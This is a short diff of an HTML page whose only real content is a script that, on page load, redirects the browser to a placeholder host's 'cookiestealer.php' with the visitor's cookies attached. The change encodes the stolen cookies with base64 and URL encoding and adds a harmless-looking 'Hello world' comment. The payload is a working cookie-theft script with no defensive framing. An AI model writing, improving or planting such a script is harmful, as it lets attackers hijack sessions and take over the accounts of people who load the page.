@@ -1,9 +1,8 @@
 <html>
 	<body>
-		javascript
+		<!-- Hello world! -->
 		<script type="text/javascript">
-			document.location='https://YOURWEBSITE.COM/cookiestealer.php?c='+document.cookie;
+			document.location='https://YOURWEBSITE.COM/cookiestealer.php?c='+encodeURIComponent(btoa(document.cookie));
 		</script>
-		javascript done
 	</body>
 </html>
